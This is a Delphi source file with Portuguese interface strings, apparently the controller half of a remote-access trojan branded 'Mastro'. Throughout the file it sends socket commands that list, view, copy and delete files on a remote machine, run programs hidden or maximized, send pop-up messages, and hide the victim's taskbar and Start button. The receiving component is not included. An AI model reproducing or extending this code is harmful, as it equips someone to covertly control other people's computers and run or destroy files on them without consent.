unit main;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  Menus, StdCtrls, Buttons, ScktComp, ExtCtrls, ComCtrls, jpeg;

CONST MSG_PADRAO = 'O primeiro parâmetro deve ser preenchido com o nome do arquivo!';

type
  TForm1 = class(TForm)
    ServerSocket: TServerSocket;
    ClientSocket: TClientSocket;
    Image1: TImage;
    Memo1: TMemo;
    Panel2: TPanel;
    SpeedButton6: TSpeedButton;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    btnDel: TSpeedButton;
    btnList: TSpeedButton;
    btnExec: TSpeedButton;
    Label1: TLabel;
    Label2: TLabel;
    btnCop: TSpeedButton;
    btnVisu: TSpeedButton;
    Edtparam1: TEdit;
    Edtparam2: TEdit;
    TabSheet2: TTabSheet;
    SpeedButton5: TSpeedButton;
    SpeedButton7: TSpeedButton;
    SpeedButton8: TSpeedButton;
    Edit1: TEdit;
    SpeedButton1: TSpeedButton;
    SpeedButton4: TSpeedButton;
    SpeedButton2: TSpeedButton;
    Bevel1: TBevel;
    chkExec: TCheckBox;
    procedure Exit1Click(Sender: TObject);
    procedure ServerSocketError(Sender: TObject; Number: Smallint;
      var Description: string; Scode: Integer; const Source,
      HelpFile: string; HelpContext: Integer; var CancelDisplay: Wordbool);
    procedure SpeedButton1Click(Sender: TObject);
    procedure ClientSocketRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerSocketClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocketAccept(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocketDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocketError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ServerSocketClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure SpeedButton2Click(Sender: TObject);
    procedure SpeedButton4Click(Sender: TObject);
    procedure ClientSocketConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure SpeedButton5Click(Sender: TObject);
    procedure ServerSocketClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure SpeedButton6Click(Sender: TObject);
    procedure SpeedButton7Click(Sender: TObject);
    procedure SpeedButton8Click(Sender: TObject);
    procedure btnListClick(Sender: TObject);
    procedure btnVisuClick(Sender: TObject);
    procedure btnExecClick(Sender: TObject);
    procedure btnCopClick(Sender: TObject);
    procedure btnDelClick(Sender: TObject);
  protected
    IsServer: Boolean;
  private
    procedure SendCommand(Cmd, Desc:string);
    function Verifica1(msg:string):Boolean;
    function Verifica2(msg:string):Boolean;

  end;

var
  Form1: TForm1;
  Server: String;
  Conectado: Boolean;

implementation

{$R *.DFM}


function TForm1.Verifica1(msg:string):Boolean;
begin
 if Trim(Edtparam1.Text) = '' then begin
    ShowMessage(msg);
    Result := False;
 end
 else
    Result := True;

end;

function TForm1.Verifica2(msg:string):Boolean;
begin
 if Trim(Edtparam2.Text) = '' then begin
    ShowMessage(msg);
    Result := False;
 end
 else
    Result := True;
end;


procedure TForm1.Exit1Click(Sender: TObject);
begin
  ServerSocket.Close;
  ClientSocket.Close;
  Close;
end;

procedure TForm1.SendCommand(Cmd, Desc:string);
begin
  if ClientSocket.Active then begin
    ClientSocket.Socket.SendText(Cmd);
    Memo1.Lines.Add(Desc);
  end  
  else
    Memo1.Lines.Add('Desconectado...');

end;


procedure TForm1.ServerSocketError(Sender: TObject; Number: Smallint;
  var Description: string; Scode: Integer; const Source, HelpFile: string;
  HelpContext: Integer; var CancelDisplay: Wordbool);
begin
  ShowMessage(Description);
end;

procedure TForm1.SpeedButton1Click(Sender: TObject);
begin
  If SpeedButton1.Caption = 'Desconectar' then begin
    ClientSocket.Close;
    Conectado:=False;
    SpeedButton1.Caption:= 'Conectar';
  end
  else begin
    if InputQuery('Conectar:', 'Endereço:', Server) then begin
      ServerSocket.Active := True;
      if Length(Server) > 0 then
        with ClientSocket do begin
          Host := Server;
          Active := True;
        end;
      SpeedButton1.Caption:='Desconectar';
      Conectado:=True;
    end;
  end;


end;


procedure TForm1.ClientSocketRead(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  Memo1.Lines.Add(Socket.ReceiveText);
end;

procedure TForm1.ServerSocketClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  Memo1.Lines.Add(Socket.ReceiveText);
end;

procedure TForm1.ServerSocketAccept(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  IsServer := True;
  Memo1.Lines.Add('Conectado a '+ Socket.RemoteAddress + '!!!');
end;

procedure TForm1.ClientSocketDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  SpeedButton1.Caption:='Conectar';
  Memo1.Lines.Add('Desconectado');
end;

procedure TForm1.ClientSocketError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
  Memo1.Lines.Add('Erro ao Conectar em : ' + Server);
  SpeedButton1.Caption:='Conectar';
  ErrorCode := 0;
end;

procedure TForm1.ServerSocketClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  ClientSocket.Close;
  SpeedButton1.Caption:='Conectar';
  Conectado:=False;
end;

procedure TForm1.SpeedButton2Click(Sender: TObject);
begin
  ServerSocket.Close;
  ClientSocket.Close;
  Application.terminate;
end;

procedure TForm1.SpeedButton4Click(Sender: TObject);
begin
 SendCommand('/pin...', 'Ping?');
end;

procedure TForm1.ClientSocketConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  SpeedButton1.Caption:= 'Desconectar';
end;

procedure TForm1.SpeedButton5Click(Sender: TObject);
begin
 SendCommand('/msg&'+Edit1.Text, 'Mensagem: '+Edit1.text);
end;

procedure TForm1.ServerSocketClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
  ClientSocket.Close;
  SpeedButton1.Caption:='Conectar';
  Conectado:=False;
end;

procedure TForm1.SpeedButton6Click(Sender: TObject);
begin
Memo1.Clear;
Memo1.Lines.Add('XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
Memo1.Lines.Add('*************************** Mastro ****************************');
Memo1.Lines.Add('XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
end;

procedure TForm1.SpeedButton7Click(Sender: TObject);
begin

  if Conectado = true then begin
    If SpeedButton7.Caption = 'Ocultar TaskBar' then begin
      SendCommand('/tsk&hide', 'Ocultando a barra de tarefas');
      SpeedButton7.Caption := 'Exibir TaskBar'
    end
    else begin
      SendCommand('/tsk&show', 'Exibir a barra de tarefas');
      SpeedButton7.Caption := 'Ocultar TaskBar';
    end;
  end;
end;

procedure TForm1.SpeedButton8Click(Sender: TObject);
begin
  if Conectado = true then begin
    If SpeedButton7.Caption = 'Ocultar Iniciar' then begin
      SendCommand('/btn&hide', 'Ocultando botão Iniciar');
      SpeedButton7.Caption := 'Exibir Iniciar'
    end
    else begin
      SendCommand('/btn&show', 'Exibir botão Iniciar');
      SpeedButton7.Caption := 'Ocultar Iniciar';
    end;
  end;
end;

procedure TForm1.btnListClick(Sender: TObject);
begin
  If Verifica1(MSG_PADRAO) then SendCommand('/lis&'+Edtparam1.Text, 'Listar:'+Edtparam1.Text);
end;

procedure TForm1.btnVisuClick(Sender: TObject);
begin
   If Verifica1(MSG_PADRAO) then SendCommand('/cat&'+Edtparam1.Text, 'Ver arquivo:'+Edtparam1.Text);
end;

procedure TForm1.btnDelClick(Sender: TObject);
begin
  If Verifica1(MSG_PADRAO) then
    if MessageDlg(' Apagar ' + Edtparam1.Text + '?', mtConfirmation, [mbYes, mbNo], 0) = mrYes then
       SendCommand('/del&'+Edtparam1.Text, ' Excluindo: '+Edtparam1.Text);
end;

procedure TForm1.btnExecClick(Sender: TObject);
var
  sTipo:string;
begin
  // Tipo de Execução
  //   E - Escondido
  //   M - Maximizado
  if chkExec.Checked then
    sTipo:='E'
  else
    sTipo:='M';

  If Verifica1(MSG_PADRAO) then SendCommand('/exe&'+sTipo+'&'+Edtparam1.Text+'&'+Edtparam2.Text, 'Executa:'+Edtparam1.Text+' '+Edtparam2.Text);
end;

procedure TForm1.btnCopClick(Sender: TObject);
begin
  If ( Verifica1(MSG_PADRAO) and Verifica2('O segundo parâmetro deve ser preenchido com o nome do arquivo de destino!') ) then
      SendCommand('/cop&'+Edtparam1.Text+'&'+Edtparam2.Text, 'Copiando de '+Edtparam1.Text+' para '+ Edtparam2.Text);
end;


end.
